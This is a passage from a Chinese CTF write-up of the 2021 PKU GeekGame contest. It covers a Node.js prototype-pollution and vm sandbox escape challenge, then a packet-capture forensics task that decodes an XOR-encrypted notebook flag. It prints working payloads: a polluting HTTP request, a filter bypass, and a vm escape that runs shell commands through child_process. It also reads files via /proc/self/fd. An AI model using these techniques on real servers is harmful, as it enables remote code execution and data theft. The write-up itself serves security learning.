<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113203158595.png"></p>
<p>然后改改上面的 payload</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /api/demo.json?in_path[]=0/constructor/length&amp;out_path[]=constructor/prototype/eval_enabled<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>再看参数，现在 <code>eval_enabled</code> 就变为数字的 1 了。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113203448554.png"></p>
<p>这里发现有点锅，得重启一下。</p>
<blockquote>
<p><strong>关于 Web 题目环境</strong></p>
<p>为了避免选手之间互相干扰，Web 题目为每个选手分配一个独立的后端环境。            </p>
<p>点击 “打开/下载题目” 时，将会访问启动器（网址形如 <code>prob**-manager.geekgame.pku.edu.cn/docker-manager/start?...</code>），这个系统将启动一个该题的后端环境（域名形如 <code>prob**-xxxxxxxx.geekgame.pku.edu.cn</code>），并将选手重定向过去。            </p>
<p><strong>持续 15 分钟没有人访问时，后端环境将自动关闭。</strong>下次点击 “打开/下载题目” 时会重新启动一个新的环境。            </p>
<p>如果环境出现问题，选手可以将启动器网址的 <code>/start</code> 改成 <code>/stop</code> 来手动关闭题目。 手动关闭后需要等待一分钟方可重新启动。            </p>
<p><strong>所有 Web 题目环境均没有外网，</strong>因此无法反弹 Shell。            </p>
<p><em>via <a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/faq/">https://geekgame.pku.edu.cn/faq/</a></em></p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">https://prob11-manager.geekgame.pku.edu.cn/docker-manager/stop?&lt;your_token&gt;
https://prob11-manager.geekgame.pku.edu.cn/docker-manager/start?&lt;your_token&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后会分配一个新的 docker 环境。。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113204053080.png"></p>
<p>现在就能执行代码了。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113204131054.png"></p>
<blockquote>
<p>赛后看其他师傅的 wp，发现其实那个 url 里的 <code>settings</code> 过滤，直接加个 <code>/</code> 就能绕过了，也就是</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /eval_settings/?on=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>记得先访问一下这个让 <code>req.session.activated = 1</code>。</p>
<pre class="line-numbers language-none"><code class="language-none">/activate?code=flag{I-Can-activate-FRom-Prototype}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后就能 eval 了。</p>
</blockquote>
<p><strong>再看咋 RCE 呢。</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span><span class="token punctuation">(</span>eval_mode <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^\([^a-zA-Z"',;]+\)$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>term<span class="token punctuation">)</span><span class="token punctuation">)</span>
    term <span class="token operator">=</span> <span class="token function">safe_eval</span><span class="token punctuation">(</span>term<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><code>safe_eval.js</code></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> child_process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token constant">CLIENT_CODE</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
const vm = require("vm");
const code = __USERCODE__;
console.log(vm.runInNewContext(code, {}));
</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">TIMEOUT_MS</span> <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">safe_eval</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> code <span class="token operator">=</span> <span class="token constant">CLIENT_CODE</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'__USERCODE__'</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> stdout <span class="token operator">=</span> child_process<span class="token punctuation">.</span><span class="token function">execFileSync</span><span class="token punctuation">(</span><span class="token string">'/usr/local/bin/node'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'-'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
            input<span class="token operator">:</span> code<span class="token punctuation">,</span>
            env<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
            timeout<span class="token operator">:</span> <span class="token constant">TIMEOUT_MS</span><span class="token punctuation">,</span>
            encoding<span class="token operator">:</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span>
            killSignal<span class="token operator">:</span> <span class="token string">'SIGTERM'</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> stdout<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> s<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
    safe_eval<span class="token operator">:</span> safe_eval<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>想到可以 <strong>用 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/JSFuck">JSFuck</a> 来绕过这个 regex</strong>。</p>
<p>但是，发现由于是在 header 里传的，太长了就不行了直接 431 了。</p>
<p>先不管这个，接下来就是 <strong>vm 逃逸</strong>，这个其实相对 vm2 而言还挺简单，直接运行 <code>this.constructor.constructor('return this.process.env')()</code> 就能拿到主函数的上下文环境。</p>
<p>执行系统命令就可以用 <code>this.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString()</code></p>
<p>这里读文件的话就可以直接用 fs，<code>this.constructor.constructor("require('fs').readFileSync('/proc/xxxx/fd/xx')")</code> 大概这样。</p>
<hr>
<p>然而，其实还有个问题，**<code>FLAG2</code> 已经被设为 <code>null</code> 了，而且文件已经被 unlink 删了**。</p>
<p><code>getflag.js</code></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token parameter">path</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> f<span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        f <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">openSync</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">//return 'failed';</span>
        <span class="token keyword">throw</span> e<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">let</span> content <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token punctuation">{</span>encoding<span class="token operator">:</span> <span class="token string">'utf-8'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fs<span class="token punctuation">.</span><span class="token function">unlinkSync</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> content<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
    getflag<span class="token operator">:</span> getflag<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但是，他 <code>fs</code> 没 close 啊！！！！</p>
<p>我们还是可以从主程序的 fd（file descriptor）里拿到的！</p>
<p>也就是 <code>/proc/self/fd/xx</code>，可能要爆破一下，当然也可以本地跑起来看看。</p>
<hr>
<p>这时又想了想是不是从 env 去打，也就是 fork 新进程的时候通过环境变量来执行命令，参考 <a href="https://miaotony.xyz/2020/11/23/CTF_2020NJUPTCTF/#PackageManager-v1-0">NCTF 2020 的 PackageManager_v1.0 一题</a>。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211120022920684.png"></p>
<p>但发现这题里 <code>env: {}</code> 已经赋值为空了，不能通过污染原型链来赋值了……</p>
<p>呜呜呜。</p>
<hr>
<p>于是又回来考虑 jsfuck 的问题，这题这一问本来还想抢一血的，结果从第一天做到了最后一天也没解出来，最后发现果然要优化 jsfuck 啊，好气啊！</p>
<p><strong>TODO</strong></p>
<blockquote>
<p><strong>Extensive Reading:</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/swv-l/writeups/blob/master/2019-harekaze-a-z.md">Harekaze 2019 “[a-z().]” (200)</a></p>
</blockquote>
<h2 id="翻车的谜语人"><a href="#翻车的谜语人" class="headerlink" title="翻车的谜语人"></a>翻车的谜语人</h2><blockquote>
<p>作为曾担任上届比赛命题工作的资深谜语人，You 酱这次也被邀请来出一道考察信息隐写的 Misc 题目。You 酱找组委会确认了本届劳务费能否准时发放后就迅速开工了，但她不知道，这其实是一个彻彻底底的陷阱。</p>
<p>事实上，组委会曾在几个月前收到了报告，称 You 酱或违反规定在题目里私自掺杂大量私货，但这只是个猜想，不一定对。于是，组委会在邀请 You 酱命题的同时，派出间谍麻里奈小姐持续关注 You 酱的一举一动，希望能够发现决定性的证据。 </p>
<p>麻里奈小姐不负众望，通过量子波动算法截获了一段 You 酱访问境外服务器的流量记录。现在她想让你来帮忙分析其中的端倪。</p>
</blockquote>
<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>是个流量包，打开一看。</p>
<p>这一看就是 jupyter notebook 吧（</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113230533665.png"></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113230624314.png" alt="flag1"></p>
<p>分别得到 </p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"notebook"</span><span class="token punctuation">,</span><span class="token property">"content"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"cells"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token property">"metadata"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"trusted"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"cell_type"</span><span class="token operator">:</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token property">"source"</span><span class="token operator">:</span><span class="token string">"import zwsp_steg\nfrom Crypto.Random import get_random_bytes"</span><span class="token punctuation">,</span><span class="token property">"execution_count"</span><span class="token operator">:</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token property">"outputs"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"metadata"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"trusted"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"cell_type"</span><span class="token operator">:</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token property">"source"</span><span class="token operator">:</span><span class="token string">"import binascii"</span><span class="token punctuation">,</span><span class="token property">"execution_count"</span><span class="token operator">:</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token property">"outputs"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"metadata"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"trusted"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"cell_type"</span><span class="token operator">:</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token property">"source"</span><span class="token operator">:</span><span class="token string">"def genflag():\n    return 'flag{%s}'%binascii.hexlify(get_random_bytes(16)).decode()"</span><span class="token punctuation">,</span><span class="token property">"execution_count"</span><span class="token operator">:</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token property">"outputs"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"metadata"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"trusted"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"cell_type"</span><span class="token operator">:</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token property">"source"</span><span class="token operator">:</span><span class="token string">"flag1 = genflag()\nflag2 = genflag()"</span><span class="token punctuation">,</span><span class="token property">"execution_count"</span><span class="token operator">:</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token property">"outputs"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"metadata"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"trusted"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"cell_type"</span><span class="token operator">:</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token property">"source"</span><span class="token operator">:</span><span class="token string">"key = get_random_bytes(len(flag1))"</span><span class="token punctuation">,</span><span class="token property">"execution_count"</span><span class="token operator">:</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token property">"outputs"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"metadata"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"trusted"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"cell_type"</span><span class="token operator">:</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token property">"source"</span><span class="token operator">:</span><span class="token string">"key"</span><span class="token punctuation">,</span><span class="token property">"execution_count"</span><span class="token operator">:</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token property">"outputs"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token property">"output_type"</span><span class="token operator">:</span><span class="token string">"execute_result"</span><span class="token punctuation">,</span><span class="token property">"execution_count"</span><span class="token operator">:</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token property">"data"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"text/plain"</span><span class="token operator">:</span><span class="token string">"b'\\x1e\\xe0[u\\xf2\\xf2\\x81\\x01U_\\x9d!yc\\x8e\\xce[X\\r\\x04\\x94\\xbc9\\x1d\\xd7\\xf8\\xde\\xdcd\\xb2Q\\xa3\\x8a?\\x16\\xe5\\x8a9'"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"metadata"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"metadata"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"trusted"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"cell_type"</span><span class="token operator">:</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token property">"source"</span><span class="token operator">:</span><span class="token string">"def xor_each(k, b):\n    assert len(k)==len(b)\n    out = []\n    for i in range(len(b)):\n        out.append(b[i]^k[i])\n    return bytes(out)"</span><span class="token punctuation">,</span><span class="token property">"execution_count"</span><span class="token operator">:</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token property">"outputs"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"metadata"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"trusted"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"cell_type"</span><span class="token operator">:</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token property">"source"</span><span class="token operator">:</span><span class="token string">"encoded_flag1 = xor_each(key, flag1.encode())\nencoded_flag2 = xor_each(key, flag2.encode())"</span><span class="token punctuation">,</span><span class="token property">"execution_count"</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token property">"outputs"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"metadata"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"trusted"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"cell_type"</span><span class="token operator">:</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token property">"source"</span><span class="token operator">:</span><span class="token string">"with open('flag1.txt', 'wb') as f:\n    f.write(binascii.hexlify(encoded_flag1))"</span><span class="token punctuation">,</span><span class="token property">"execution_count"</span><span class="token operator">:</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token property">"outputs"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"metadata"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"trusted"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"cell_type"</span><span class="token operator">:</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token property">"source"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"execution_count"</span><span class="token operator">:</span><span class="token null keyword">null</span><span class="token punctuation">,</span><span class="token property">"outputs"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"metadata"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"kernelspec"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"python3"</span><span class="token punctuation">,</span><span class="token property">"display_name"</span><span class="token operator">:</span><span class="token string">"Python 3 (ipykernel)"</span><span class="token punctuation">,</span><span class="token property">"language"</span><span class="token operator">:</span><span class="token string">"python"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"language_info"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"python"</span><span class="token punctuation">,</span><span class="token property">"version"</span><span class="token operator">:</span><span class="token string">"3.8.3rc1"</span><span class="token punctuation">,</span><span class="token property">"mimetype"</span><span class="token operator">:</span><span class="token string">"text/x-python"</span><span class="token punctuation">,</span><span class="token property">"codemirror_mode"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"ipython"</span><span class="token punctuation">,</span><span class="token property">"version"</span><span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"pygments_lexer"</span><span class="token operator">:</span><span class="token string">"ipython3"</span><span class="token punctuation">,</span><span class="token property">"nbconvert_exporter"</span><span class="token operator">:</span><span class="token string">"python"</span><span class="token punctuation">,</span><span class="token property">"file_extension"</span><span class="token operator">:</span><span class="token string">".py"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"nbformat"</span><span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token property">"nbformat_minor"</span><span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"flag1.txt"</span><span class="token punctuation">,</span> <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"flag1.txt"</span><span class="token punctuation">,</span> <span class="token property">"last_modified"</span><span class="token operator">:</span> <span class="token string">"2021-11-06T07:43:20.952991Z"</span><span class="token punctuation">,</span> <span class="token property">"created"</span><span class="token operator">:</span> <span class="token string">"2021-11-06T07:43:20.952991Z"</span><span class="token punctuation">,</span> <span class="token property">"content"</span><span class="token operator">:</span> <span class="token string">"788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44"</span><span class="token punctuation">,</span> <span class="token property">"format"</span><span class="token operator">:</span> <span class="token string">"text"</span><span class="token punctuation">,</span> <span class="token property">"mimetype"</span><span class="token operator">:</span> <span class="token string">"text/plain"</span><span class="token punctuation">,</span> <span class="token property">"size"</span><span class="token operator">:</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token property">"writable"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"file"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>是简单的 xor，然后按照原来的代码简单还原一下就行。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> os <span class="token keyword">import</span> fspath
<span class="token comment"># import zwsp_steg</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Random <span class="token keyword">import</span> get_random_bytes
<span class="token keyword">import</span> binascii


<span class="token keyword">def</span> <span class="token function">genflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'flag{%s}'</span> <span class="token operator">%</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>get_random_bytes<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>


flag1 <span class="token operator">=</span> genflag<span class="token punctuation">(</span><span class="token punctuation">)</span>
flag2 <span class="token operator">=</span> genflag<span class="token punctuation">(</span><span class="token punctuation">)</span>
key <span class="token operator">=</span> get_random_bytes<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span><span class="token punctuation">)</span>
key
<span class="token comment"># b'\x1e\xe0[u\xf2\xf2\x81\x01U_\x9d!yc\x8e\xce[X\r\x04\x94\xbc9\x1d\xd7\xf8\xde\xdcd\xb2Q\xa3\x8a?\x16\xe5\x8a9'</span>
key1 <span class="token operator">=</span> <span class="token string">b'\x1e\xe0[u\xf2\xf2\x81\x01U_\x9d!yc\x8e\xce[X\r\x04\x94\xbc9\x1d\xd7\xf8\xde\xdcd\xb2Q\xa3\x8a?\x16\xe5\x8a9'</span>


<span class="token keyword">def</span> <span class="token function">xor_each</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>
    out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        out<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span>


encoded_flag1 <span class="token operator">=</span> xor_each<span class="token punctuation">(</span>key<span class="token punctuation">,</span> flag1<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
encoded_flag2 <span class="token operator">=</span> xor_each<span class="token punctuation">(</span>key<span class="token punctuation">,</span> flag2<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag1.txt'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>encoded_flag1<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment"># flag1.txt</span>
<span class="token comment"># 788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44</span>
flag1_en <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token string">"788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44"</span><span class="token punctuation">)</span>
flag1_de <span class="token operator">=</span> xor_each<span class="token punctuation">(</span>flag1_en<span class="token punctuation">,</span> key1<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag1_de<span class="token punctuation">)</span>
<span class="token comment"># b'flag{9d9a9d92dcb1363c26a0c29fda2edfb6}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113231017353.png"></p>
<p>save 一下，发现这个 7z 里面还得要密码。</p>
<p>strings 看一眼，发现了压缩的过程，很明显这个应该是在 terminal 里进行的，是通过 websocket 进行交互。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211114025035130.png"></p>
<p>先过滤 <code>websocket</code>，然后 <code>tcp.stream eq 11</code></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211114024909838.png"></p>
